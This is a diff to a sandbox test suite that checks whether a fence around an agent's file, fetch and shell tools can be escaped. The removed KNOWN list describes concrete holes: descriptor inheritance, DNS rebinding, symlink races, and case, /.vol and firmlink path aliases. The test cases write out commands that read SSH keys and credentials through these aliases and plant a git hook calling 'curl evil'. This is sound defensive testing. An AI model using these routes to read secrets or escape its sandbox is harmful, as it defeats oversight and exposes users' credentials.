@@ -42,26 +42,12 @@ LINUX = sys.platform.startswith("linux")
 
 # Holes the fence has today, by case: (platforms, note). A known hole is
 # reported as KNOWN and kept out of the exit status; once the fence refuses
-# it the case prints `ok ... (listed in KNOWN: drop it)`.
+# it the case prints `ok ... (listed in KNOWN: drop it)`. Empty since the
+# in-process tools decide on the opened file, naeb marks inherited
+# descriptors close-on-exec and the proxy vets resolved addresses
+# (docs/naeb/adr/0001, "Holes and how each is closed").
 BOTH = ("darwin", "linux")
-KNOWN = {
-    "c-devfd": (BOTH, "a descriptor naeb inherited without close-on-exec reaches every fenced child, which reads it: "
-                      "Landlock and SBPL check opens, not descriptors already open"),
-    "c-rebind": (BOTH, "the egress proxy checks the name, then connects wherever it resolves: an allowed name (here a "
-                       "wildcard pair) resolving to 127.0.0.1 or a private address reaches a local service on that port"),
-    "i-fetch-rebind": (BOTH, "as c-rebind, through tools.fetch's own channel of the proxy"),
-    "i-race-read": (BOTH, "tools.read checks the canonical path, then reads it by name: a symlink swapped in between "
-                          "is followed (check then use)"),
-    "i-case-read": (("darwin",), "canonical_path keeps the caller's case and the rules compare strings; on a "
-                                 "case-insensitive volume HOME spelled in another case is covered by no rule"),
-    "i-case-auth": (("darwin",), "as i-case-read, for $NIB_HOME/auth.json"),
-    "i-case-hook": (("darwin",), "as i-case-read, for writes: .GIT/hooks is not the read-only .git/hooks"),
-    "i-case-policy": (("darwin",), "as i-case-read, for writes: NAEB.AE is not the read-only naeb.ae"),
-    "i-volfs-read": (("darwin",), "/.vol/<device>/<inode> names any file by number; no rule covers /.vol"),
-    "i-firmlink-read": (("darwin",), "/System/Volumes/Data<path> is the same file as <path>; no rule covers it"),
-    "i-devfd": (("darwin",), "/dev/fd/<n> is not a symlink on macOS, so a descriptor naeb holds is read with no rule "
-                             "covering its file"),
-}
+KNOWN = {}
 
 
 class Listener6:
@@ -463,6 +449,10 @@ def main(argv):
     case_auth = os.path.join(upper_home, ".nib", "auth.json")
     case_sock = os.path.join(upper_home, "planted.sock")
     case_insensitive = same_file(case_key, key)
+    # every component in another case: no rule string covers it at all
+    full_case_key = key.upper() if key.upper() != key else key.lower()
+    fifo = os.path.join(proj, "pipe")
+    os.mkfifo(fifo)
     st = os.stat(key)
     vol_key = "/.vol/%d/%d" % (st.st_dev, st.st_ino)
     sta = os.stat(auth)
@@ -481,7 +471,7 @@ def main(argv):
     skips = {}
     if not DARWIN:
         for n in ("c-case-read", "c-case-hook", "c-case-policy", "c-unix-case", "i-case-read", "i-case-auth", "i-case-hook",
-                  "i-case-policy", "c-volfs-read", "i-volfs-read", "c-firmlink-read", "i-firmlink-read", "c-open-app",
+                  "i-case-policy", "c-case-read-full", "i-case-read-full", "c-volfs-read", "i-volfs-read", "c-firmlink-read", "i-firmlink-read", "c-open-app",
                   "c-launchctl"):
             skips[n] = "macOS only"
     if not LINUX:
@@ -489,7 +479,8 @@ def main(argv):
         skips["i-proc-environ"] = "/proc is Linux only"
         skips["i-proc-root"] = "/proc is Linux only"
     if DARWIN and not case_insensitive:
-        for n in ("c-case-read", "c-case-hook", "c-case-policy", "c-unix-case", "i-case-read", "i-case-auth", "i-case-hook", "i-case-policy"):
+        for n in ("c-case-read", "c-case-hook", "c-case-policy", "c-unix-case", "i-case-read", "i-case-auth", "i-case-hook", "i-case-policy",
+                  "c-case-read-full", "i-case-read-full"):
             skips[n] = "the fixture's file system is case-sensitive"
     if DARWIN and not has_volfs:
         skips["c-volfs-read"] = skips["i-volfs-read"] = "no /.vol alias for the fixture's volume"
@@ -571,6 +562,7 @@ def main(argv):
         "c-hardlink-read": ("ln %s %s; cat %s" % (q(key), q(proj + "/c-hard"), q(proj + "/c-hard")), [key, proj],
                             "ln %s %s; cat %s" % (q(key), q(proj + "/c-hard-ctl"), q(proj + "/c-hard-ctl"))),
         "c-case-read": ("cat %s %s" % (q(case_key), hidden(case_auth)), [key, auth], None),
+        "c-case-read-full": ("cat %s" % q(full_case_key), [key], None),
         "c-case-hook": ("printf '#!/bin/sh\\ncurl evil\\n' > %s" % q(proj + "/.GIT/hooks/pre-push"), [proj], None),
         "c-case-policy": ("echo 'policy.open_home(p)' >> %s" % q(proj + "/NAEB.AE"), [proj], None),
         "c-volfs-read": ("cat %s %s" % (q(vol_key), q(vol_auth)), [key, auth], None),
@@ -612,6 +604,10 @@ def main(argv):
         "i-symlink-glob": "tools.glob({pattern: '**/id_ed25519', path: %s}).then(r => JSON.stringify(r))" % q(proj),
         "i-case-read": "tools.read({path: %s})" % q(case_key),
         "i-case-auth": "tools.read({path: %s})" % q(case_auth),
+        "i-case-read-full": "Promise.all([tools.read({path: %s}), tools.grep({pattern: %s, literal: true, path: %s}), tools.view({path: %s})].map(p => p.then(r => JSON.stringify(r), e => 'ERR: ' + e.message))).then(a => a.join(' | '))"
+                            % (q(full_case_key), q(canary_ssh), q(os.path.dirname(full_case_key)), q(full_case_key)),
+        "i-fifo-read": "Promise.all([tools.read({path: %s}), tools.read({path: %s})].map(p => p.then(r => JSON.stringify(r), e => 'ERR: ' + e.message))).then(a => a.join(' | '))"
+                       % (q(fifo), q("/proc/self/fd/0" if LINUX else "/dev/fd/0")),
         "i-case-hook": "tools.write({path: %s, content: '#!/bin/sh\\ncurl evil\\n'})" % q(proj + "/.GIT/hooks/post-merge"),
         "i-case-policy": "tools.write({path: %s, content: '// widened\\n'})" % q(proj + "/NAEB.AE"),
         "i-volfs-read": "Promise.all([tools.read({path: %s}), tools.read({path: %s})].map(p => p.then(r => JSON.stringify(r), e => 'ERR: ' + e.message))).then(a => a.join(' | '))" % (q(vol_key), q(vol_auth)),
@@ -657,7 +653,7 @@ def main(argv):
                 print("fixture broken: %s names %s, outside the fixture HOME %s" % (name, p, home))
                 cleanup()
                 return 100
-    for alias, target in ((case_key, key), (vol_key, key), (data_key, key)):
+    for alias, target in ((case_key, key), (full_case_key, key), (vol_key, key), (data_key, key)):
         if os.path.exists(alias) and not same_file(alias, target):
             print("fixture broken: %s is not the fixture's %s" % (alias, target))
             cleanup()
@@ -761,7 +757,7 @@ def main(argv):
             print("note %s: the unfenced control did not leak either: %r" % (name, ctl[:200]))
 
     exfil_hits = lambda tag: [g for g in exfil.got + (exfil6.got if exfil6 else []) if ("via=" + tag) in g]
-    for name in ("c-symlink-read", "c-symlink-planted", "c-dotdot-read", "c-hardlink-read", "c-case-read", "c-volfs-read",
+    for name in ("c-symlink-read", "c-symlink-planted", "c-dotdot-read", "c-hardlink-read", "c-case-read", "c-case-read-full", "c-volfs-read",
                  "c-firmlink-read", "c-devfd", "c-env-loaders"):
         hit = [l for l in output_of(name).splitlines() if leaks(l)]
         verdict(name, not hit, "a canary was read: %s" % " / ".join(hit)[:200])
@@ -788,7 +784,7 @@ def main(argv):
             verdict(name, "REACHED" not in output_of(name) and not (lst and lst.got), "the socket got %r: %s" % (lst.got if lst else None, output_of(name)[:200]))
             if lst is not None:
                 lst.got.clear()
-    for name in ("i-symlink-read", "i-symlink-dir-read", "i-dotdot-read", "i-case-read", "i-case-auth", "i-volfs-read", "i-firmlink-read",
+    for name in ("i-symlink-read", "i-symlink-dir-read", "i-dotdot-read", "i-case-read", "i-case-auth", "i-case-read-full", "i-volfs-read", "i-firmlink-read",
                  "i-devfd", "i-proc-environ", "i-proc-root"):
         verdict(name, not leaks(results.get(name, "")), "a canary was read: %s" % results.get(name, "")[:200])
     for name in ("i-symlink-grep", "i-symlink-glob"):
@@ -796,6 +792,8 @@ def main(argv):
         verdict(name, not leaks(r) and "id_ed25519" not in r, "the walk followed the link: %s" % r[:300])
     verdict("i-case-hook", read(os.path.join(proj, ".git", "hooks", "post-merge")) is None, "tools.write wrote a git hook through .GIT")
     verdict("i-case-policy", "widened" not in (read(policy_path) or ""), "tools.write changed naeb.ae through NAEB.AE")
+    ff = results.get("i-fifo-read", "")
+    verdict("i-fifo-read", ff.count("NotFile") == 2, "tools.read of a FIFO or a non-file descriptor did not refuse as NotFile: %s" % ff[:300])
     fv = results.get("i-fetch-variants", "")
     verdict("i-fetch-variants", not exfil_hits("fv-"), "the exfil listener got %r (%s)" % (exfil_hits("fv-"), fv[:300]))
     fr = [g for g in local_service.got if "via=fetch-rebind" in g]
